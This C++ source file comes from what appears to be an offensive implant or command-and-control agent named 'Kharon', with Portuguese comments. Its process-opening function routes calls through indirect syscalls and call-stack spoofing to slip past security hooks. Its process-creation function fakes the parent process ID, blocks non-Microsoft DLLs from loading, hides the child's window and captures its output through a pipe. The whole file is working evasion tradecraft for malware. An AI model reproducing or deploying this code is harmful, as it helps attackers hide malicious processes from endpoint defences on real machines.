#include <Kharon.h>

auto DECLFN Process::Open(
    _In_ ULONG RightsAccess,
    _In_ BOOL  InheritHandle,
    _In_ ULONG ProcessID
) -> HANDLE {
    const UINT32 Flags    = Self->KH_SYSCALL_FLAGS;
    NTSTATUS     Status   = STATUS_UNSUCCESSFUL;
    HANDLE       Handle   = nullptr;
    CLIENT_ID    ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };
    OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr) };

    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        return Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
    }

    UPTR Address = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::OpenProc].Instruction
        : (UPTR)Self->Ntdll.NtOpenProcess;

    UPTR ssn = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::OpenProc].ssn
        : 0;

    if ( Flags & SYSCALL_INDIRECT && ! ( Flags & SYSCALL_SPOOF ) ) {
        SyscallExec(Sys::OpenProc, Status, &Handle, RightsAccess, &ObjAttr, &ClientID);
    } else {
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)&Handle, (UPTR)RightsAccess,
            (UPTR)&ObjAttr, (UPTR)&ClientID
        );
    }

    Self->Usf->NtStatusToError( Status );

    return Handle;
}

auto DECLFN Process::Create(
    _In_  PCHAR                CommandLine,
    _In_  ULONG                InheritHandles,
    _In_  ULONG                PsFlags,
    _Out_ PPROCESS_INFORMATION PsInfo
) -> BOOL {
    BOOL   Success      = FALSE;
    ULONG  TmpValue     = 0;
    HANDLE PipeWrite    = nullptr;
    HANDLE PipeDuplic   = nullptr;
    HANDLE PipeRead     = nullptr;
    HANDLE PsHandle     = nullptr;
    BYTE*  PipeBuff     = nullptr;
    ULONG  PipeBuffSize = 0;
    UINT8  UpdateCount  = 0;

    LPPROC_THREAD_ATTRIBUTE_LIST AttrBuff = nullptr;
    UPTR                         AttrSize;

    STARTUPINFOEXA      SiEx         = { 0 };
    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), nullptr, TRUE };

    if ( Self->Ps->Ctx.BlockDlls ) { UpdateCount++; };
    if ( Self->Ps->Ctx.ParentID  ) { UpdateCount++; };

    SiEx.StartupInfo.cb          = sizeof( STARTUPINFOEXA );
    SiEx.StartupInfo.wShowWindow = SW_HIDE;

    PsFlags |= CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT;

    if ( UpdateCount ) {
        Self->Krnl32.InitializeProcThreadAttributeList( 0, UpdateCount, 0, &AttrSize );
        AttrBuff = (LPPROC_THREAD_ATTRIBUTE_LIST)hAlloc( AttrSize );
        Success = Self->Krnl32.InitializeProcThreadAttributeList( AttrBuff, UpdateCount, 0, &AttrSize );
        if ( ! Success ) { goto _KH_END; }
    }

    if ( Self->Ps->Ctx.ParentID  ) {
        PsHandle = Self->Ps->Open( PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, Self->Ps->Ctx.ParentID );
        if ( ! PsHandle || PsHandle == INVALID_HANDLE_VALUE ) {
            Success = FALSE; goto _KH_END;
        }
        
        Success = Self->Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &PsHandle, sizeof( HANDLE ), 0, 0 );
        if ( ! Success ) { goto _KH_END; }
    }

    if ( Self->Ps->Ctx.BlockDlls ) {
        UPTR Policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        Success = Self->Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( UPTR ), nullptr, nullptr );
        if ( ! Success ) { goto _KH_END; }
    }
    
    if ( AttrBuff ) {
        SiEx.lpAttributeList = AttrBuff;
    }

    if ( Self->Ps->Ctx.Pipe ) {
        Success = Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, 0 ); // Use 0 for default buffer
        if ( !Success ) { goto _KH_END; }

        SiEx.StartupInfo.hStdError  = PipeWrite;
        SiEx.StartupInfo.hStdOutput = PipeWrite;
        SiEx.StartupInfo.hStdInput  = Self->Krnl32.GetStdHandle( STD_INPUT_HANDLE );
        SiEx.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;

        // Se for processo com parent spoofing, duplicamos o handle
        if ( Self->Ps->Ctx.ParentID ) {
            Success = Self->Krnl32.DuplicateHandle(
                NtCurrentProcess(), 
                PipeWrite, 
                PsHandle, 
                &PipeDuplic, 
                0,
                TRUE, 
                DUPLICATE_SAME_ACCESS
            );
            
            if ( ! Success || !PipeDuplic || PipeDuplic == INVALID_HANDLE_VALUE ) { 
                goto _KH_END; 
            }
            
            // Fecha o handle original e usa o duplicado
            Self->Ntdll.NtClose( PipeWrite );
            PipeWrite = PipeDuplic;
            SiEx.StartupInfo.hStdError = PipeWrite;
            SiEx.StartupInfo.hStdOutput = PipeWrite;
        }
    }

    Success = Self->Krnl32.CreateProcessA(
        nullptr, CommandLine, nullptr, nullptr, TRUE, // IMPORTANTE: InheritHandles = TRUE
        PsFlags,
        nullptr, Self->Ps->Ctx.CurrentDir, &SiEx.StartupInfo, PsInfo
    );

    // Fecha o handle de escrita APÓS criar o processo
    if ( PipeWrite ) {
        Self->Ntdll.NtClose( PipeWrite );
        PipeWrite = nullptr;
    }

    if ( ! Success ) { 
        goto _KH_END; 
    }

    if ( Self->Ps->Ctx.Pipe ) {
        // Espera o processo terminar
        DWORD waitResult = Self->Krnl32.WaitForSingleObject( PsInfo->hProcess, INFINITE );
        
        if ( waitResult == WAIT_OBJECT_0 ) {
            // Lê o output do pipe
            Success = Self->Krnl32.PeekNamedPipe(
                PipeRead, nullptr, 0, nullptr, (LPDWORD)&PipeBuffSize, nullptr
            );
            
            if ( Success && PipeBuffSize > 0 ) {
                PipeBuff = (PBYTE)hAlloc( PipeBuffSize + 1 ); // +1 para null terminator
                if ( PipeBuff ) {
                    Success = Self->Krnl32.ReadFile(
                        PipeRead, PipeBuff, PipeBuffSize, (LPDWORD)&TmpValue, nullptr
                    );
                    
                    if ( Success ) {
                        // Garante null termination para string
                        PipeBuff[TmpValue] = 0;
                        Self->Ps->Out.p = PipeBuff;
                        Self->Ps->Out.s = TmpValue;
                        
                        KhDbg( "Process output: %d bytes", TmpValue );
                        KhDbg( "Output: %s", PipeBuff );
                    } else {
                        hFree( PipeBuff );
                        PipeBuff = nullptr;
                    }
                }
            } else {
                KhDbg( "No output available or PeekNamedPipe failed" );
            }
        } else {
            KhDbg( "Wait for process failed: %d", waitResult );
        }
    }

_KH_END:
    if ( AttrBuff  ) { 
        Self->Krnl32.DeleteProcThreadAttributeList( AttrBuff );
        hFree( AttrBuff ); 
    }
    if ( PipeWrite ) Self->Ntdll.NtClose( PipeWrite );
    if ( PipeRead  ) Self->Ntdll.NtClose( PipeRead );
    if ( PsHandle  ) Self->Ntdll.NtClose( PsHandle );
    
    // if ( PsInfo->hProcess ) Self->Ntdll.NtClose( PsInfo->hProcess );
    // if ( PsInfo->hThread  ) Self->Ntdll.NtClose( PsInfo->hThread  );

    return Success;
}
